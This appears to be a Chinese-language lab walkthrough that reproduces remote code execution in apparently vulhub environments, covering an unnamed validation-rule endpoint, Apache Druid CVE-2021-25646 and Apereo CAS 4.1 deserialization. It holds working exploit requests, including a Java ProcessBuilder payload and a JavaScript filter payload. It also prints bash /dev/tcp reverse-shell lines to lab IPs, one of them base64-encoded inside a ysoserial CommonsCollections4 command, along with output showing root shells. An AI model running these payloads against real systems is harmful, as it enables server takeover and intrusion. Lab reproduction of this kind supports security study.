Host: your-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}

```

<font style="color:#1f2328;background-color:#FFFFFF;">可见，</font><font style="color:#1f2328;">id</font><font style="color:#1f2328;background-color:#FFFFFF;">命令已经执行成功：</font>

<!-- 这是一张图片，ocr 内容为：REQUEST RESPONSE IN JSON DECODER  CHINESE JSON DECODER PRETTY HTTP/1.1  200 POST /DATASETPARAN/VERIFICATION:SWAGGER UI/ HTIP/1.1 ACCESS-CONTROL-AL HOST: LOW-CRODONTIA AR-ARGNT: HOZILLE/5,O (VINDONS HO.0;  NINB升; N68) AGY,36 USER-AGER AGGEPT:TE 5 ACCESS-CONTROL-EXPOSE-HEADERS: ACCEPT-ENCODING: GZIP, DEFLATE, B CONTENT-TYPE:APPLICATION/JSON:CHARSET:UTF-8 AOOEPT-LONGUAGE:ZH-CN.ZH:Q.9 CONTENT-TYPE:APPLICATION/JSON:CHARSET-UTF-8 DATE:MON. 20 NAY 2024 16:05:27 GMT CONNECTION:CLOSE CONNECTION:CLOSE CONTENT-LENGTH:110 CONTENT-LENGTH:339 'CODE*:'200 "PARANNANE 'NESSAGE":操作成 "PARANDESO':"". ?EXT":NULL. DATA":"UID-0(ROOT) GID-0(ROOT) GROUPSMO(ROOT)" "REQUIREDFLAG":1. -VALIDATIONRULEO "FUNCTION VERIFICATION(DATA)FA - NEW JAVA.LANG.FANG.F SR(A));SS'';WHILE((LINE 与 READLINEO) IS NUTD)(55+111111111133 SS:]- -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803816849-d7d8c6ba-c082-4069-bf18-f97d58f966c3.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apache Druid </font><font style="color:#1f2328;background-color:#FFFFFF;">代码执行漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2021-25646</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache Druid 0.20.0</font><font style="color:#1f2328;background-color:#FFFFFF;">服务器：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">服务启动后，访问</font><font style="color:#1f2328;">http://your-ip:8888</font><font style="color:#1f2328;background-color:#FFFFFF;">即可查看到</font><font style="color:#1f2328;background-color:#FFFFFF;">Apache Druid</font><font style="color:#1f2328;background-color:#FFFFFF;">主页。</font>

[<u>https://github.com/j2ekim/CVE-2021-25646</u>](https://github.com/j2ekim/CVE-2021-25646)

<font style="color:#333333;">漏洞探测</font><font style="color:#333333;">py</font><font style="color:#333333;">脚本</font>

<!-- 这是一张图片，ocr 内容为：-(KALISKALI)-[~/DOWNLOADS/CVE-2021-25646] LS README README.MD CVE-2021-25646.PY IMG1 .PNG (KALISKALI)-[DOWNLOADS/CL ADS/CVE-2021-25646] S PYTHON3 CVE-2021-25646.DY -U HTTP://192.168.254.135:888 C "PING 5AP7TA. APACHE DNSLOG.CN [+]漏洞存在,请前往DNSLOG平台再次确认 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803817012-90851a02-4ae3-494d-bbbc-2070990d4b39.png)

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8888/UNIFIED-CONSOLE.HTML EXPLOIT-DB OFFENSIVE SECURITY KALI TOOLS KALI FORUMS MSFU KALI LINUX KALI TRAINING NETHUNTER OTHER BOOKMARKS KALI DOCS DRUID LNGESTION 主 SEGMENTS DATASOURCES LOAD DATA QUERY SERVICES 三SUPERVISORS L SEGMENTS STATUS DATASOURCES O DATASOURCES APACHE DRUID IS RUNNING VERSION NO SUPERVISORS 0 SEGMENTS 0.20.0 9 EXTENSIONS LOADED TASKS SERVICES LOOKUPS LOOKUPS UNINITIALIZED 1 OVERLORD,1 COORDINATOR THERE ARE NO TASKS 1 ROUTER,1 BROKER 1 HISTORICAL,1 MIDDLE MANAGER -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803818342-d6a1c24a-cf5c-4bab-a2ae-bc10e237be8b.png)

## <font style="color:#1a1a1a;">添加部署</font>
<font style="color:#4d4d4d;background-color:#FFFFFF;">点击</font><font style="color:#4d4d4d;background-color:#FFFFFF;">Load data</font>

<!-- 这是一张图片，ocr 内容为：PINP LI SEGMENTS QUERY LOAD DATA DATASOURCES SERVICES INGESTION 三SUPERVISORS DATASOURCES 山SEGMENTS STATUS ERROR:REQUEST FAILED WITH STATUS CODE 502 ERROR:REQUEST FAILED WITH STATUS CODE 502 ERROR:REQUEST FAILED WITH STATUS CODE 502 APACHE DRUID IS RUNNING VERSION 0.20.0 9 EXTENSIONS LOADED LOOKUPS [TASKS SERVICES ERROR:REQUEST FAILED WITH STATUS CODE 502 LOOKUPS UNINITIALIZED ERROR:REQUEST FAILED WITH STATUS CODE 502 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803818297-89fcbad5-fabf-4204-b437-f47b3992bb8b.png)

<font style="color:#4d4d4d;background-color:#FFFFFF;">start</font><font style="color:#4d4d4d;background-color:#FFFFFF;">后选择</font><font style="color:#4d4d4d;background-color:#FFFFFF;">local disk</font>

<!-- 这是一张图片，ocr 内容为：DRUID 血SEGMENTS QUERY LOAD DATA DATASOURCES SERVICES NGESTIOR VERIFY AND SUBMIT TRANSFORM DATA AND CONFIGURE SCHEMA TUNE PARAMETERS CONNECT AND PARSE RAW DATA 72 EDIT SPEC PUBLISH FILTER PARTITION PARSE TIME TUNE PARSE DATA CONNECT CONFIQURE SCHEMA START TRANSFORM AMAZON KINESIS AMAZON S3 AZURE DATA LAKE AZURE EVENT HUB APACHE KAFKA HTTP(S):// GOOGLE CLOUD STORAGE REINDEX FROM DRUID HTTP(S) HDFS LOCAL DISK OTHER EXAMPLE DATA PASTE DATA -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803818411-272c7f9d-7d75-4905-88bd-beac35d058fe.png)

<font style="color:#4d4d4d;background-color:#FFFFFF;">进行填入：</font>

```plain
Base directory:
quickstart/tutorial/
File filter:
wikiticker-2015-09-12-sampled.json.gz
```

<!-- 这是一张图片，ocr 内容为：DRUID LOAD DATA (INGESTION QUERY S型 SERVICES DATASOURCES SEGMENTS VERIFY AND SUBMIT TRANSFORM DATA AND CONFIGURE SCHEMA TUNE PARAMETERS CONNECT AND PARSE RAW DATA EDIT SPEC FILTER PARSE TIME START TRANSFORM PUBLISH CONFIGURE SCHEMA CONNECT PARTITION TUNE PARSE DATA DRUID INGESTS RAW DATA AND CONVERTS IT INTO A CUSTOM, INDEXED FORMAT THAT IS OPTIMIZED FOR ANALYTIC QUERIES. TO GET STARTED.PLEASE SPECIFY WHAT DATA YOU WANT TO INGEST. LEARN MORE SOURCE TYPE LOCAL BASE DIRECTORY QUICKSTART/TUTORIAL/ FILE FILTER WIKITICKER-2015-09-12-SAMPLED JSO ;  TENMLIDEDA,  CTRNANE   CONNENT;DE   CONNE      TENIE   CONNE   CONITS  CONNTR  COUNTRNANORYMOUS 'S (TIME":2015-09-12T00:47:58320Z",CHANNEL:FE ['TIME":2015-09-12T00:48:02.596Z"," Z",CHANNEL".9 RESMHEN DEDER''STINNE  'NEST "  CONINEN  SOUNTY  SOUNTY  SINTION DEX'  '  SINTYNARS'SINTRISOCODEX ;  THIS PATH MUST BE AVAILABLE ON ["TIME":2015-09-12T00:07282Z,,0 THE LOCAL FILESYSTEM OF ALL DRUID ["TIME,2015-09-12T00:48:10.048Z",CHANNEL: [TIME":2015-09-12100:12.732Z,,G Z",CHANNEL":# SERVICES. APPLY NEXT:PARSE DATA Y -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803818758-41821ce7-ac29-4381-86ca-a7b77dc4efa4.png)

<font style="color:#4d4d4d;background-color:#FFFFFF;">点击</font><font style="color:#4d4d4d;background-color:#FFFFFF;">Apply,</font><font style="color:#4d4d4d;background-color:#FFFFFF;">一路</font><font style="color:#4d4d4d;background-color:#FFFFFF;">next</font><font style="color:#4d4d4d;background-color:#FFFFFF;">到</font><font style="color:#4d4d4d;background-color:#FFFFFF;">filter</font>

## <font style="color:#1a1a1a;">抓包请求构造</font><font style="color:#1a1a1a;">RCE</font>
```plain
"filter":{

"type":"javascript",

"function":"function(value){return java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.254.130/8000 0>&1')}",

"dimension":"added",

"":{

"enabled":"true"

}

}
```

<!-- 这是一张图片，ocr 内容为：RESPONSE REQUEST PRETYRAWININACTIONSY 1 POST /DRUI D/INDEXER/V1/SAMPLER?FOR-FILTER HITP/1.1 2 HOST:192.169.254.135:888 3 UBER-AGENT: MOZILLA/5.D (X1L; LINUX XBS 64; RV:109.0) GECKO/2010101 FIREFOX/LLS.0 4 ACCEPT:APPLICATION/JSON,TEXT/PLAIN,*/* 5 ACCEPT-LANGUAGE:EN-US,EN;Q.5 6 ACCEPT-ENCODING:GZIP,DEFLATE 7CONTENT-TYPE: APPLICATION/JSON;CHARSET-UTF-G 8CONTENT-LENGTH:10249 10 COMMUNT HT ICORA2,168.754,15:8000 11 REFERER:HTTP://192.16G.254.135:89GE/UNIFIED-CONSOLE.HTML 13 TYPE":"INLINE', DITHEDILIDELIDITIONDLIDEDITH EL':\'2015-09~12T00:47:08.770Z\*\'CHANNELL';\***********************CITYNAMG\';NU LLDERIDITH UND ING RUDITH UND RIDITION DITEL INPUTFORMAT*: TYPE' JSON''. DATASCHEME:I -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803818708-2b3294f5-a563-48ac-9165-263d56ea9bf6.png)

<!-- 这是一张图片，ocr 内容为：ANNEL\":\"#EN.WIKIPEDIA\",\"CITYNAME\":NULL,\"COMMENT\":\"BOT UPDATING ATING UNBLOCK REQUEST TABLE ([[EN:WP:PEACHYIPEACHY 2.0 (ALPHA 8)J]]]".\"COUNTRYISOCODE! INPUTFORMAT": TYPE'' JSON', KEEPNULLCOLUMNS':TRUE DATASCHEMA": "DATASOURCE":"SAMPLE", TIMESTAMPSPEC":{ "COLUMN":"TIME', "FORMAT":"ISO" DIMENSIONSSPEC": TRANSFORMSPEC": TRANSFORMS":[ "FILTER":1 TYPE":"JAVASCRIPT", 'DIMENSION":"ADDED", ENABLED':"TRUE* TYPE":" INDEX", "TUNINGCONFIG': "TYPE":"INDEX" "SAMPLERCONFIG":{ "NUMROWS*:500 "TIMEOUTMS':15000 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803819319-3ecbfb9a-06ac-40a6-8a65-f79e0dd5b8f6.png)

<font style="color:#4d4d4d;background-color:#FFFFFF;">开启站点接收</font><font style="color:#4d4d4d;background-color:#FFFFFF;">RCE</font><font style="color:#4d4d4d;background-color:#FFFFFF;">请求</font><font style="color:#4d4d4d;background-color:#FFFFFF;">,</font><font style="color:#4d4d4d;background-color:#FFFFFF;">成功反弹拿到</font><font style="color:#4d4d4d;background-color:#FFFFFF;">shell</font>

<!-- 这是一张图片，ocr 内容为：-(KALISKALI)-[~/DESKTOP/VULHUB-MASTER/AIRFLOW/CVE-2020-17526) 1 NC -LNVP 8000 TRANSFORMSPEC":1 HELP LISTENING ON [ANY] 8000 FROM (UNKNOWN) [192.168.254.135] 44406 [192.168.254.130] CONNECT TO SET BASH:CANNOT TERMINAL PROCESS GROL 5 GROUP (28): INAPPROPRIATE IOCTL FOR DEVICE CONTROL IN THIS SHELL JOB BASH:NO "TYPE":"JAVASCRIPT", ROOT@6C145DDCB775://OPT/DRUID# WHOAMI "FUNCTION":"FUNCTION(VA WHOAMIS@LOCATHOST CVE-2021-256467$ "DIMENSION":"ADDED", ROOT 18 ROOT@6C145DDCB775://OPT/DRUID# ID 19 ENAB LED":TRUE ID 20 UID-0(ROOT) GID-0(ROOT) GROUPS-0(ROOT) ROOT@6C145DDCB775://OPT/DRUID# -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803819473-d9656c02-ecec-449e-a651-3f40a4f323f3.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">Apereo CAS 4.1 </font><font style="color:#1f2328;background-color:#FFFFFF;">反序列化命令执行漏洞</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">环境搭建</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">Apereo CAS 4.1.5</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">环境启动后，访问</font><font style="color:#1f2328;">http://your-ip:8080/cas/login</font><font style="color:#1f2328;background-color:#FFFFFF;">即可查看到登录页面。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/CAS/LOGIN EXPLOIT-DB OFFENSIVE SECURITY MSFU KALI FORUMS NETHUNTER KALI TRAINING KALI TOOLS KALI DOCS OTHER BOOKMARKS KALI LINUX CAS APEREO SERVING THE ACADEMIC MISSION NON-SECURE CONNECTION YOV ARE  URENTIY ACCESSING   NORER  NANSEINGLE   YOU MUST LOG IN OVER HTTPS. ENTER YOUR USERNAME AND PASSWORD FOR SECURITY REASONS, PLEASE LOG OUT AND EXIT YOUR WEB BROWSER WHEN YOU ARE DONE ACCESSING SERVICES THAT REQUIRE AUTHENTICATION! USERNAME: LANGUAGES: NEDERLANDS ENGLISH RUSSIAN LTALIANO URDU SVENSKA SPANISH FRENCH CHINESE(SIMPLIFIED) CROATIAN UKRANIAN DEUTSCH CHINESE(TRADITIONAL) JAPANESE PORTUGUESE CZECH CATALAN SLOVENIAN ARABIC FARSI MACEDONIAN PASSWORD: POLISH PORTUGUESE(BRAZIL) LOGIN CLEAR COPYRIGHT O 2005-2015 APEREO, INC. ALL RIGHTS RESERVED. POWERED BY APEREO CENTRAL AUTHENTICATION SERVICE 4.1.5 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803819681-c0b76c21-ff82-4d4d-ba71-c095a1d0e6b0.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">漏洞原理实际上是</font><font style="color:#1f2328;background-color:#FFFFFF;">Webflow</font><font style="color:#1f2328;background-color:#FFFFFF;">中使用了默认密钥</font><font style="color:#1f2328;">changeit</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

```plain
public class EncryptedTranscoder implements Transcoder {
private CipherBean cipherBean;
private boolean compression = true;

public EncryptedTranscoder() throws IOException {
BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
bufferedBlockCipherBean.setKeyAlias("aes128");
bufferedBlockCipherBean.setKeyPassword("changeit");
bufferedBlockCipherBean.setNonce(new RBGNonce());
this.setCipherBean(bufferedBlockCipherBean);
}

// ...
```

<font style="color:#1f2328;background-color:#FFFFFF;">我们使用</font>[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：</font>

```plain
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

<!-- 这是一张图片，ocr 内容为：(KALI)--[-[DOWNLOADS] DEDSTATE L$ JAVA -JAR APEREO-CAS-ATTACK-1.0-SNAPSHOT-ALL.JAR COMMONSCOLLECTIONS4 TOU CH /TMP/SUCCESS" CESS-WARN TO ENABLE WARNINGS JAVA_OPTIONS: -DAWT.USESYSTEMAAFONTSETTINGS-ON -DSWING.AATEXT-TRUE PICKED UP 0909C022-ECD0-41C9-9313-BAFA791518FB.AAAAIGAAAABAL0109%2FIAKYU8PQG6YVT99AAAAAAABM FLCZEYOF4KDPE7TM17T7JR3YPGPRKTQZUH2OCICRD6SVF32TNSFSYWUHYOTKQWHNURMWGLOZPS9IG FLW59ST3ADQFOK2Y265CQZFISWSN3EAAGVCCHJEL74EN2BMAIUOVZEJ3S686RX009ULSK2BE2IXNC 20THHIWRHSFFNANINSTIOHFAFORJUUBSIVL8PSIL62B1X9D6BEQ2FKAPEIWQN4BHOAE3EQYAFOSAP 1T864412UDENTBX17MVO93SHBBIKFUYJWWWPTMWCZLYHKOK9WNSYPUWACSFKYUFI88KESTGEJFEP HYXC9LJAV2YH5BCGY%281%28828PZETHH8DBILVELCPUEDHINZ50L7NJD6JVQ55QPMFOE8JBX1LK THPNDZG6H709JJOYROLJVKHA8I8SY282807KEUXXAVA6QGK4NPBWFEUVMZY2BNGMDC90N21Z9WWO PTWC2ZW24XE3SDKHKNS12EDWLRUH2TQEEVY7RIK6E7S4VJ4ECOMSGBOWCOPM6DHZVYU2JZSJ60V27 GPZ7ZXBCOXVNJJF7WVFOLCOKKHDGO2MPFSUMEBVGXOOBED4FLZNNHPFWF6MASN18RXZUZ5YMOK23G AXHIWV%2B33ACIY09SJWEE7RPA6BLNS28DZ1ZLOPRWYFGBNFXDUAB6DEUZYVFX5ZB85IA087LO EZJY2C7LIG&28GH&287MXPY3KZFVFITPPSGXJN65BQVTWOG名2FTCYMFBKTVFMNICOVNVZALUJJVZX VLTGLGAGFWNGES6X%2F3OPJIDKIC4U792SAMKPSULHWWMYE2WVY9EESM8DZKPWO1UVWNPVB5XZY5L 40SFNAPBXDWJVUKKOJSKKVANFUBLSSY918CSBN1HSHXQ7E665RAHUYSIPWKAYXQHWIPESFHNGBDO L5F%287MYDAGCVXS1%2BU6ZWA3F1CPWSBJ4QE4RXCZQE3WDXHMVOCSSTCLBT6697V2ZX828CCPWOWL EDHLIZBEWOVTVLKTFGKQ876Z2UW96LOKEV22B3UHXKSLPMB7KDK28WNGIHQ7T7UX5PP6KTAS5RR XXQ40MS2F3NT3UUOLSE13F CVAOP2TE8JWN900CE9RLMSWN4%2FWBDLN4GAU0HPAKRXVBOG3VNPMEI CSBX5GKVNVEBBC3MDBGNV名2F9KWO%2BTDM82BZ9CQJC40IV05%2FQ6TA0ZNX5EFBFO5B2NDFAOTL O PXSWW2GGUUAVPJ5Y7%2BNPW2YL301PODJKOJY88XVHZ82F7EL4RO10L6ZDJ84ZXMKYWYIVIS3PIF% 2BFCE90SQ57ZT266COG489TOENOXSBG8IJ7TADSOZTLZHY20I6ZMTEY2KIOUDBFSINL4QOYYNYHR9 NNXQHTYGTEJDZOGYDSS596JCOFUS4XGMU2WXJIBQMRQKJFKTH5H3QEYB254HCMNHIOQ3I13QW%28Z X2F7AQXLDWVSIYPBUMWSVPCXOQNX8ENGQ34DJEDSABVVU%2FTJCYKDXKFCPDOMVKTALNXSIPKDY63 KVE2C828SXFD3L82BDFOIUKTFGLVX3MG2ARNQZY0ZD39YF6UX2F8DQPLPENJBQWGKHOVPHSSJADZS WCULI7W50ZANMAFH5SC8YBFAFJX2FZ5%28%2FWLINLR04S8SJPVNE05IXLQ6%2BA50GUITL9ZDNVD ASCYEJCQJONFDUBJPXTV58SZJDOMK7ST7OPIZNEGALZFDLTFANAN6YFGTESAVLHCODNCYFE%2BVCP, PHNVIDZS7EG5SNHWPWSK9IEX2BCAPVN9%2BXONIQA13I82FRQ093IZTC2Y82FXOSSAEWVYKWO6GQB AVCYVGJD8288YNKR22POLVFH7PCOATNPAK9BEWKSPKIZHSKS628SUEGA%2FTX2FJERWA9H7381TOB PHTJ92VXNJQARN240ZSUXQZWWISHYTXLASY0107C110PH3RX7MVZIYCXS9ERSLMM4ZDGEFY20IM SPRXIYTGBTNXWBYP%2BJRW251V2DKIXCU%2FG6VKDSV1JXBWS6 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820076-6b991a2a-bdd5-4191-8f7a-80c295a6fa80.png)

<font style="color:#1f2328;background-color:#FFFFFF;">然后我们登录</font><font style="color:#1f2328;background-color:#FFFFFF;">CAS</font><font style="color:#1f2328;background-color:#FFFFFF;">并抓包，将</font><font style="color:#1f2328;background-color:#FFFFFF;">Body</font><font style="color:#1f2328;background-color:#FFFFFF;">中的</font><font style="color:#1f2328;">execution</font><font style="color:#1f2328;background-color:#FFFFFF;">值替换成上面生成的</font><font style="color:#1f2328;background-color:#FFFFFF;">Payload</font><font style="color:#1f2328;background-color:#FFFFFF;">发送：</font>

```plain
username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
```

<!-- 这是一张图片，ocr 内容为：192.168.254.135:8080/CAS/LOGIN KALI TRAINING NETHUNTER KALI LINUX KALI DOCS KALI FORUMS KALI TOOLS APEREO SERVINA THE ACADEMIC MISSION GO TO APEREO HOME PAGE NON-SECURE CONNECTION YOU ARE CURRENTLY ACCESSING CAS OVER A NON-SECURE CONNECTION. SINGLE S LOG IN OVER HTTPS. ENTER YOUR USERNAME AND PASSWORD FOR SECURITY REASONS, PLEASE THAT REQUIRE AUTHENTICATION! USERNAME: LANGUAGES: ADMIN SPANISH ENGLISH FRER CHINESE(SIMPLIFIED) CHI SLOVENIAN CAT CZECH PASSWORD: PORTUGUESE(BRAZIL) POLIS LOGIN CLEAR -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820520-33eeae7a-bec4-494a-ba79-ac9aa9516beb.png)<!-- 这是一张图片，ocr 内容为：RESPONSE REQUEST PRETTY PRETTY ACTIONS Y ACTIONS POST /CAS/LOGIN HTTP/1.1 HTTP/1.1 500 2PRAGMA:NOCACHE HOST:192.168.254 135:8080 3 USER-AGENT: MOZILLA/5.0 (X1L; LINUX X86.64; RV:109.0) GECKO/20101 FIREFOX/115.0 3 EXPI RES:THU,01 JAN 1970 00:00 GMT A/ACCEPT:TEXT/HTML,APPLICATION/XHTUL+XML.APPLICATION/XML:GRD.9,INAGE/AVIF,INAGE/NEBP,*/*IQ-0.B ACACHECONTROL:NOCACHE 5 CACHE CONTROL: NOSTORE 5 ACCEPT-LANGUAGE:EN-US,EN;QX0.5 6 SET:COOKIE: JSESSIONTD-0GELIC66546F376F2859379CEFE6C80E; PATH-/CAS; HTTPONLY 6ACCEPT.ENCODING:GZIP,DEFLATE 7CONTENT.TYPE:APPLICATION/X-WWW.FORM.URLENCODED CONTENTYPE:TEXT/HTML;CHARSETUTF.8 CONTENTENTLENGTH;1399 CONTENTLENGTH:2255 9 DA 9 ORIGIN:HTTP://192.168.254.135:8080 2024 07:20:03 GMT DATE:SUN,23 JUN 2024 10 C CONNECTION:CLOSE LO CONNECTION:CLOSE 11 REFERER:HTTP://192.168.254.135:8080/CAS/LOGIN 12 COOKIE: JSESSIONID-46F4EE7449F319A4CEA2694CD8E77874 13UPGRADE-INSECURE-REQUESTS: 1 14<!DOCTYPE HTML> 14 15 H2OC 16 WVP 18 VQ5S5QPMFOE8 19 TANCILHKG SENSYRLNACSRYUTUUF3BRERBIRHUXCJUACIUACSRACSRABRERB3B3B3B3ERB3B3B3B3BIERBIERERERERERESSESSEB CHTMLANGEN <META CHARSET'UTF.8 /> META NAME-'VIEWPORT CONTENT-"WIDTH-DEVICE-WIDTH, INITIAL-SCALE-L'> <TITLE> CAS SW8211;CENTRAL AUTHENTICATION SERVICE </TITLE> LINK REL:'STYLESHEET HREF-"/CAS/CAS.CSS.CSS' /> <LINK REL-ICON" HREF三//CAS/FAVICON.ICO" TYPE-'IMAGE/X-ICON" /Z 243 33 33 <L--[IFLT IE9]> <SCRIPT SRCE'//CDNIS.CLOUDFLARE.COM/AIAX/LIBS/HTMLSSHIV/3.6.1/HTMLSSHIV.IS" TYPE三"TA <![ENDIF].. -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820948-abc6c821-96e8-4d19-8c2f-c529c7005746.png)

<font style="color:#1f2328;background-color:#FFFFFF;">登录</font><font style="color:#1f2328;background-color:#FFFFFF;">Apereo CAS</font><font style="color:#1f2328;background-color:#FFFFFF;">，可见</font><font style="color:#1f2328;">touch /tmp/success</font><font style="color:#1f2328;background-color:#FFFFFF;">已成功执行：</font>

<!-- 这是一张图片，ocr 内容为：[CENTOS@LOCALHOST 4.1-RCE] SUDO DOCKE PS WORD FOR CENTOS: SUDOL PASSWORD COMMAND IMAGE CONTAINER ID CREATED STATUS PORTS NAMES "CATALINA.SH RUN" VULHUB/APEREO-CAS:4.1.5 14 MINUTES AGO 0DBE35AAD3BF 41-RCE-WEB-1 0.0.0.0:8080-980/TCP, UP 14 MINUTES :8080-98080/TCP [CENTOSALOCALHOST 4.1-RCELS SUDO DOCKER EXEC -IT ODBE35AAD3BF BASH ]$ ROOT@ODBE35AAD3BF://USR/LOCAL/TOMCAT# TMP/TMP/ HSPERFDATA ROOT SUCCESS ROOT@0DBE35AAD3BF://USR/LOCAL/TOMCAT# -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803820820-7dc84d6a-13f4-430e-a7e4-6c3de4956ed5.png)

## <font style="color:#1a1a1a;">写入反弹</font><font style="color:#1a1a1a;">shell</font>
<font style="color:#1f2328;background-color:#FFFFFF;">构造反弹</font><font style="color:#1f2328;background-color:#FFFFFF;">shell</font><font style="color:#1f2328;background-color:#FFFFFF;">并进行</font><font style="color:#1f2328;background-color:#FFFFFF;">base64</font><font style="color:#1f2328;background-color:#FFFFFF;">编码</font>

```plain
bash -i >& /dev/tcp/192.168.174.128/9999 0>&1  (base64编码)
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}

java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"

```

<!-- 这是一张图片，ocr 内容为：BASE64在线编码解码 BASE64.US (最好用的BASE64在线工具) BASE64 I URLENCODE MD5 I TIMESTAMP 请输入要进行BASE64编码或解码的字符 BASH-I>&/DEV/TCP/192.168.254.130/99999 0>&1 编码(ENCODE) 解码(DECODE) 交换 (编码快捷键: CTRL ENTER BASE64编码或解码的结果: YMFZACATASA+JIAVZGV2L3RICC8XOTLUMTY4LIIINC4XMZAVOTK5OSAWPIYX -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780803821352-6c7e9dc9-ed60-46fc-acb1-c2001f4ad0bb.png)

<!-- 这是一张图片，ocr 内容为：(KALISKALI)-[DOWNLOADS] S JAVA -JAR APEREO-CAS-ATTACK-1.0-SNAPSHOT-ALL.JAR LL.JAR COMMONSCOLLECTIONS4 "BAS H -C FECHO,YMFZACATASA+JIAVZGV2L3RJCC8XOTIUNTY4LJIINCAXMZAVOTK5OSAWPIYXI/BAS E64,-D}L{BASH,-IJ"E LRCLEGAL-ACCESSWARN TO ER  -JAVA_OPTIONS: -DAWT.USESYSTEMAAFONTSETTINGS-ON -DSWING.AATEXT:TRUE PICKED UP A9FC0621-F79B-4CFB-842E-A315A8DAE541.AAAAIGAABAABAPFKIGYCSPFS2BEWDNBWO%2BLKAAAA BMFLCZEYOFD3DMDVNAF350U82BN6382BRBYYWN7SRECHNNOUBHSNBXLDUANANYKFCWBJHTIEYDAVUL 2KKTYY9XU6CV55SDKKYW30SFCPBEZIDRURB69LYHOU9FUFTSCBE3XZBXJAEMGYH82FY4QUXHPA%28 R82FJEV865A4UK3D5PGIYGIH9VBAU400NCXGFALJRJG3WFBYTDLICB1OARRVIUZSFYTE3CJM2328F IJ6NGPYK4YUQWMLEU63HNDZU2NYHWE3MQCVGTXZH82FBZHUSMG30F%2F3AHNCOB2K82FFMXP1729R TQ8NDNC4TNIDKHY7VDIROUDLQRS9JEQUJFEJ1LEPHG9SFZXAYBZAYBZA0S28CYX13%2BPA9FVJ82E AXYHYISQSPPPPPFRDOIYT82BR5YBA5YBSSTWXEUPHQSUYTQBPOSBDS1FQ6X32BPD8VS0CARYNEIPIC QZWH8697N2YER09AK2AQYVFNNTT1SLPFKEVTDVLGUUC%284KKPQFAT2%2FS%2FVEX名2FEWEWED5DZ 02662JPP0377ASCP1CD8KK5I1K828FY3FHCY3HUKN%2F6%2BVEG6NWYQ7PGHZNZD%2BP2%2FT0ANG 40MP6NFYRS66PSWADDSBTTBIIAWSTLA32FXYPDCXZ82FKOLC06CBSQ2HSAENQWEBTDRFYIYXCA5 82FQHZYFQQUGOMHZFKDFZZJW3MR%28BOC6XM3YQZOQOMAXPYVFVCLXQKCVJY1CA82FRZPJHUZPDO. 600JP9828S50GIHYLNXSAS0JRVQ394VSQQNKNGVH3GPDIEYEVLXOSADLDYPMJL5E1BNAVSPEVBNC7 